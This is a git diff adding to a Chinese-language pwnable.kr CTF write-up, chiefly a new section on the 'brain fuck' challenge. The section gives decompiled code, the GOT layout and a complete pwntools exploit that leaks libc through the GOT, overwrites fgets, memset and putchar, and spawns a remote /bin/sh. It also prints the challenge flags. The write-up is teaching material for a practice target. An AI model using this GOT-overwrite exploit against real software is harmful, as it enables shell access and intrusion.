@@ -12012,7 +12012,7 @@ io.sendline(b'1')
 io.recvuntil(b'How many EXP did you earned? : ')
 io.sendline(str(result).encode())
 flag = io.recvline().decode()   # Magic_spell_1s_4vad4_K3daVr4!
-log.success(flag) 
+log.success('Flag: %s' % flag) 
 io.close()
 ```
 
@@ -12045,8 +12045,199 @@ io.close()
     You found "Harry Potter" (EXP +841356444)
     Select Menu:
 [+] result => 796419901
-[+] Magic_spell_1s_4vad4_K3daVr4!
+[+] Flag: Magic_spell_1s_4vad4_K3daVr4!
 [*] Closed connection to pwnable.kr port 9032
+```
+
+------
+
+### brain fuck
+
+这是**Pwnable.kr**的第二十二个挑战`brain fuck`，来自**[Rookiss]**部分。好家伙，`who-you-know`和他的魂器出现啦。
+
+```bash
+I made a simple brain-fuck language emulation program written in C. 
+The [ ] commands are not implemented yet. However the rest functionality seems working fine. 
+Find a bug and exploit it to get a shell. 
+
+Download : http://pwnable.kr/bin/bf
+Download : http://pwnable.kr/bin/bf_libc.so
+
+Running at : nc pwnable.kr 9001
+```
+
+`wget`下载二进制文件`bf`和相应的`bf_libc.so`。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr/bf]
+└─$ wget http://pwnable.kr/bin/bf
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr/bf]
+└─$ wget http://pwnable.kr/bin/bf_libc.so
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr/bf]
+└─$ sudo chmod +x ./bf 
+```
+
+先`file ./bf`查看文件类型，再`checksec --file=./bf`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr/bf]
+└─$ file ./bf        
+./bf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=190d45832c271de25448cefe52fbd15ea9ed5e65, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr/bf]
+└─$ checksec --file=./bf           
+[*] '/home/tyd/ctf/pwn/pwnable.kr/bf/bf'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+使用`IDA pro 32bit`打开附件`bf`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  size_t i; // [esp+28h] [ebp-40Ch]
+  char s[1024]; // [esp+2Ch] [ebp-408h] BYREF
+  unsigned int v6; // [esp+42Ch] [ebp-8h]
+
+  v6 = __readgsdword(0x14u);
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  p = (int)&tape;    // 变量tape的内存地址被转换成int型后保存在p中
+  puts("welcome to brainfuck testing system!!");
+  puts("type some brainfuck instructions except [ ]");
+  memset(s, 0, sizeof(s));
+  fgets(s, 1024, stdin);
+  for ( i = 0; i < strlen(s); ++i )
+    do_brainfuck(s[i]);
+  return 0;
+}
+```
+
+变量`tape`的内存地址被转换成`int`型后保存在`p`中，需要注意的是`p`和`tape`都位于`.bss`段，相当于全局变量。
+
+```assembly
+.bss:0804A080 p               dd ?                    ; DATA XREF: do_brainfuck:loc_80485FE↑r
+.bss:0804A080                                         ; do_brainfuck+2A↑w ...
+.bss:0804A084                 align 20h
+.bss:0804A0A0 tape            db    ? ;               ; DATA XREF: main+6D↑o
+```
+
+而`.bss`段前面的代码就是程序的`got`表，距离很近，很让人想修改。
+
+```assembly
+.got.plt:0804A000 _got_plt        segment dword public 'DATA' use32
+.got.plt:0804A000                 assume cs:_got_plt
+.got.plt:0804A000                 ;org 804A000h
+.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC
+.got.plt:0804A000                                         ; DATA XREF: _init_proc+9↑o
+.got.plt:0804A000                                         ; __libc_csu_init+B↑o ...
+.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048430↑r
+.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048430+6↑r
+.got.plt:0804A00C off_804A00C     dd offset getchar       ; DATA XREF: _getchar↑r
+.got.plt:0804A010 off_804A010     dd offset fgets         ; DATA XREF: _fgets↑r
+.got.plt:0804A014 off_804A014     dd offset __stack_chk_fail
+.got.plt:0804A014                                         ; DATA XREF: ___stack_chk_fail↑r
+.got.plt:0804A018 off_804A018     dd offset puts          ; DATA XREF: _puts↑r
+.got.plt:0804A01C off_804A01C     dd offset __gmon_start__
+.got.plt:0804A01C                                         ; DATA XREF: ___gmon_start__↑r
+.got.plt:0804A020 off_804A020     dd offset strlen        ; DATA XREF: _strlen↑r
+.got.plt:0804A024 off_804A024     dd offset __libc_start_main
+.got.plt:0804A024                                         ; DATA XREF: ___libc_start_main↑r
+.got.plt:0804A028 off_804A028     dd offset setvbuf       ; DATA XREF: _setvbuf↑r
+.got.plt:0804A02C off_804A02C     dd offset memset        ; DATA XREF: _memset↑r
+.got.plt:0804A030 off_804A030     dd offset putchar       ; DATA XREF: _putchar↑r
+.got.plt:0804A030 _got_plt        ends
+```
+
+程序根据用户输入的内容，依次将每个字符传入`do_brainfuck()`函数执行。双击`do_brainfuck()`函数查看详情：
+
+```c
+int __cdecl do_brainfuck(char a1)
+{
+  int result; // eax
+  _BYTE *v2; // ebx
+
+  result = a1 - 43;
+  switch ( a1 )
+  {
+    case '+':     // p所指向的值+1, 即tape+1
+      result = p;
+      ++*(_BYTE *)p;
+      break;
+    case ',':    // 输入
+      v2 = (_BYTE *)p;
+      result = getchar();
+      *v2 = result;
+      break;
+    case '-':    // p所指向的值-1, 即tape-1
+      result = p;
+      --*(_BYTE *)p;
+      break;
+    case '.':    // 输出*p
+      result = putchar(*(char *)p);
+      break;
+    case '<':    // p值-1
+      result = --p;
+      break;
+    case '>':    // p值+1
+      result = ++p;
+      break;
+    case '[':
+      result = puts("[ and ] not supported.");
+      break;
+    default:
+      return result;
+  }
+  return result;
+}
+```
+
+将`p`指针移动到`fgets`函数在`got`表中的位置，泄露`fgets`在内存中的地址以计算`libc`的基地址，从而根据题目给出的`bf_libc.so`计算出`gets`和`system`的地址。我们构造`payload`的目的是通过指针在`.bss`段的读取和写入操作实现覆写`GOT`，编写`Python`代码求解，获得`shell`后输入`cat flag`得到`flag`：`BrainFuck? what a weird language..`。
+
+```python
+from pwn import *
+
+elf = ELF('./bf')
+got = {'fgets': elf.got['fgets'], 'memset': elf.got['memset'], 'putchar': elf.got['putchar']}
+libc = ELF('./bf_libc.so')
+offset = {'fgets': libc.symbols['fgets'], 'gets': libc.symbols['gets'], 'system': libc.symbols['system']}
+main_addr = elf.symbols['main']  # 0x8048671
+tape_addr = 0x804a0a0  # default p-pointer value
+
+move_addr = lambda cur, new: b'<'*(cur-new) if cur > new else b'>'*(new-cur)
+read_addr = lambda n: b'.>'*n + b'<'*n
+write_addr = lambda n: b',>'*n + b'<'*n
+
+payload = move_addr(tape_addr, got['fgets'])   # 将p指针从tape移动到fgets函数在GOT中的地址
+payload += read_addr(4)    # 读取fgets函数在GOT中的地址
+payload += write_addr(4)   # 将tape指针当前位置的值system_addr写入GOT中的fgets函数地址，以覆写该地址
+payload += move_addr(got['fgets'], got['memset'])  # 将tape指针移动到memset函数在GOT中的地址
+payload += write_addr(4)   # 将tape指针当前位置的值gets_addr写入GOT中的memset函数地址，以覆写该地址
+payload += move_addr(got['memset'], got['putchar'])  # 将tape指针移动到putchar函数在GOT中的地址
+payload += write_addr(4)   # 将tape指针当前位置的值main_addr写入GOT中的putchar函数地址，以覆写该地址
+payload += b'.'  # 调用putchar函数，因为该地址被覆写了所以此时会返回到主函数 return main 
+io = remote('pwnable.kr', 9001)
+io.recvuntil(b'[ ]\n')
+io.sendline(payload)
+sleep(1)
+fgets_addr = u32(io.recv(4).ljust(4, b'\x00'))
+# fgets_addr = int.from_bytes(io.recv(4), byteorder='little', signed=False)
+log.info('fgets_addr => %s' % hex(fgets_addr))
+libc_base = fgets_addr - offset['fgets']
+log.success('libc_base_addr => %s', hex(libc_base))
+gets_addr = libc_base + offset['gets']
+log.info('gets_addr => %s' % hex(gets_addr))
+system_addr = libc_base + offset['system']
+log.info('system_addr => %s' % hex(system_addr))
+shellcode = p32(system_addr) + p32(gets_addr) + p32(main_addr) + b'/bin/sh'
+io.sendline(shellcode)
+io.interactive()
 ```
 
 ------
